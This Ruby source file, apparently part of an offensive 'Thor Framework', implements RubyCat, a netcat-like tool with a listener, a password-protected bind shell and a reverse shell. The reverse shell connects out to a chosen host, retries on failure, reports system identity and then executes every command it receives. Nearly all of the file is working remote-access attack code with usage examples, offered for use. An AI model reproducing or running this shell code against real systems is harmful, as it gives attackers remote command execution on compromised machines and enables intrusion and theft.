#!/usr/bin/env ruby

#            ---------------------------------------------------
#                              Thor Framework                                                                     
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"

require 'optparse'

def cls
  if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
    system('cls')
  else
    system('clear')
  end
end

def randz
  (0...1).map{ ('0'..'3').to_a[rand(4)] }.join
end

class RubyCat
  def initialize
    require 'ostruct'
    require 'socket'
    require 'open3'
  end

  # Simple NetCat Type Functionality
  def listener(port=31337, ip=nil)
    # It is all in how we define our socket
    # Spawn a server or connect to one....
    if ip.nil?
      server = TCPServer.new(port)
      server.listen(1)
      @socket = server.accept
    else
      @socket = TCPSocket.open(ip, port)
    end
    # Actual Socket Handling
    puts "#{g}Handling new connection..."
    sleep(0.5)
    puts "#{g}Sending payload to target..."
    sleep(0.5)
    puts "#{g}Connecting to target..."
    sleep(0.5)
    puts "#{g}Opening target shell..."
    sleep(1)
    while(true)
      if(IO.select([],[],[@socket, STDIN],0))
        socket.close
        return
      end
      begin
        while( (data = @socket.recv_nonblock(100)) != "")
          STDOUT.write(data);
        end
        break
      rescue Errno::EAGAIN
      end
      begin
        while( (data = STDIN.read_nonblock(100)) != "")
          @socket.write(data);
        end
        break
      rescue Errno::EAGAIN
      rescue EOFError
        break
      end
      IO.select([@socket, STDIN], [@socket, STDIN], [@socket, STDIN])
    end
  end

  # Ruby Bind Command Shell
  # Password Required to Access, default: knock-knock
  # Send Password as first send when connecting or get rejected!
  def bind_shell(port=31337, password='knock-knock')
    # Messages for those who visit but don't have proper pass
    @greetz=["Piss Off!", "Grumble, Grumble......?", "Run along now, nothing to see here.....", "Who's There?"]

    # The number over loop is the port number the shell listens on.
    Socket.tcp_server_loop("#{port}") do |socket, client_addrinfo|
      command = socket.gets.chomp
      if command.downcase == password
        socket.puts "\nYou've Been Authenticated!\n"
        socket.puts "This Bind connection brought to you by a little Ruby Magic xD\n"
        socket.puts "Type 'EXIT' or 'QUIT' to exit shell & keep port listening..."
        socket.puts "Type 'KILL' or 'CLOSE' to close listenr for good!\n\n"
        socket.puts "Server Info: "
        begin
          if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
            count=0
            while count.to_i < 3
              if count.to_i == 0
                command="echo Winblows"
                socket.print "BUILD: "
              elsif count.to_i == 1
                command="whoami"
                socket.print "ID: "
              elsif count.to_i == 2
                command="chdir"
                socket.print "PWD: "
              end
              count = count.to_i + 1
              Open3.popen2e("#{command}") do | stdin, stdothers |
                IO.copy_stream(stdothers, socket)
              end
            end
          else
            count=0
            while count.to_i < 3
              if count.to_i == 0
                command="uname -a"
                socket.print "BUILD: \n"
              elsif count.to_i == 1
                command="id"
                socket.print "ID: "
              elsif count.to_i == 2
                command="pwd"
                socket.print "PWD: "
              end
              count = count.to_i + 1
              Open3.popen2e("#{command}") do | stdin, stdothers |
                IO.copy_stream(stdothers, socket)
              end
            end
          end
          # Then we drop to sudo shell :)
          while(true)
            socket.print "\n(RubyCat)> "
            command = socket.gets.chomp
            if command.downcase == 'exit' or command.downcase == 'quit'
              socket.puts "\ngot r00t?\n\n"
              break # Close Temporarily Since they asked nicely
            end
            if command.downcase == 'kill' or command.downcase == 'close'
              socket.puts "\ngot r00t?\n\n"
              exit # Exit Completely when asked nicely :p
            end
            # Use open3 to execute commands as we read and write through socket connection
            Open3.popen2e("#{command}") do | stdin, stdothers |
              IO.copy_stream(stdothers, socket)
            end
          end
          rescue
            socket.write "Command or file not found!\n"
            socket.write "Type EXIT or QUIT to close the session.\n"
            socket.write "Type KILL or CLOSE to kill the shell completely.\n"
            socket.write "\n\n"
            retry
          ensure
            @cleared=0
            socket.close
          end
        else
          num=randz
          socket.puts @greetz[num.to_i]
        end

    end
  end

  # Ruby Reverse Command Shell
  def reverse_shell(ip='127.0.0.1', port=31337, retries='5')
    while retries.to_i > 0
      begin
        socket = TCPSocket.new "#{ip}", "#{port}"
        break
      rescue
        # If we fail to connect, wait a few and try again
        sleep 10
        retries = retries.to_i - 1
        retry
      end
    end
    # Run commands with output sent to stdout and stderr
    begin
      socket.puts "This Reverse connection brought to you by a little Ruby Magic xD\n\n"
      socket.puts "Server Info:"
      # First we scrape some basic info....
      if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
        count=0
        while count.to_i < 3
          if count.to_i == 0
            command="echo Winblows"
            socket.print "BUILD: \n"
          elsif count.to_i == 1
            command="whoami"
            socket.print "ID: "
          elsif count.to_i == 2
            command="chdir"
            socket.print "PWD: "
          end
          count = count.to_i + 1
          # Open3 to exec
          Open3.popen2e("#{command}") do | stdin, stdothers |
            IO.copy_stream(stdothers, socket)
          end
        end
      else
        count=0
        while count.to_i < 3
          if count.to_i == 0
            command="uname -a"
            socket.print "BUILD: \n"
          elsif count.to_i == 1
            command="id"
            socket.print "ID: "
          elsif count.to_i == 2
            command="pwd"
            socket.print "PWD: "
          end
          count = count.to_i + 1
          # Oen3 to exec
          Open3.popen2e("#{command}") do | stdin, stdothers |
            IO.copy_stream(stdothers, socket)
          end
        end
      end
      # Now we drop to Pseudo shell :)
      while(true)
        socket.print "\n(RubyCat)> "
        command = socket.gets.chomp
        if command.downcase == 'exit' or command.downcase == 'quit'
          socket.puts "\nOK, closing connection....\n"
          socket.puts "\ngot r00t?\n\n"
          break # Exit when asked nicely :p
        end
        # Open3 to exec
        Open3.popen2e("#{command}") do | stdin, stdothers |
          IO.copy_stream(stdothers, socket)
        end
      end
    rescue
      # If we fail for some reason, try again
      retry
    end
  end
end

# Main --
options = {}
optparse = OptionParser.new do |opts| 
  opts.banner = "Usage: #{$0} [OPTIONS]"
  opts.separator ""
  opts.separator "EX: #{$0} -l -p 31337"
  opts.separator "EX: #{$0} -b -p 31337"
  opts.separator "EX: #{$0} -b -p 31337 -P knock-knock"
  opts.separator "EX: #{$0} -r -i 10.10.10.10 -p 31337"
  opts.separator ""
  opts.separator "Options: "
  opts.on('-c', '--connect', "\n\tSimple Connector") do |mode|
    options[:method] = 0
  end
  opts.on('-l', '--listen', "\n\tSetup Listener") do |mode|
    options[:method] = 1
  end
  opts.on('-b', '--bind', "\n\tSetup Bind Shell") do |mode|
    options[:method] = 2
  end
  opts.on('-r', '--reverse', "\n\tSetup Reverse Shell") do |mode|
    options[:method] = 3
  end
  opts.on('-i', '--ip IP', "\n\tIP for Reverse Shell Connection") do |ip|
    options[:ip] = ip.chomp
  end
  opts.on('-p', '--port PORT', "\n\tPort to Use for Connection") do |port|
    options[:port] = port.to_i
  end
  opts.on('-P', '--pass PASS', "\n\tPassword for Bind Shell") do |pass|
    options[:pass] = pass
  end
  opts.on('-h', '--help', "\n\tHelp Menu") do 
    cls
    banner
    puts
    puts opts
    puts
    exit 69;
  end
end
begin
  foo = ARGV[0] || ARGV[0] = "-h"
  optparse.parse!
  if options[:method].to_i == 3 or options[:method].to_i == 0
    mandatory = [:method,:port,:ip]
  else
    mandatory = [:method,:port]
  end
  missing = mandatory.select{ |param| options[param].nil? }
  if not missing.empty?
    cls
    banner
    puts
    puts "Missing options: #{missing.join(', ')}"
    puts optparse
    exit 666;
  end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
  cls
  banner
  puts
  puts $!.to_s
  puts
  puts optparse
  puts
  exit 666;   
end

rc = RubyCat.new
case options[:method].to_i
when 0
  rc.listener(options[:port].to_i, options[:ip])
when 1
  rc.listener(options[:port].to_i)
when 2
  if options[:pass].nil?
    rc.bind_shell(options[:port].to_i)
  else
    rc.bind_shell(options[:port].to_i, options[:pass].to_s)
  end
when 3
  rc.reverse_shell(options[:ip], options[:port].to_i)
end
#EOF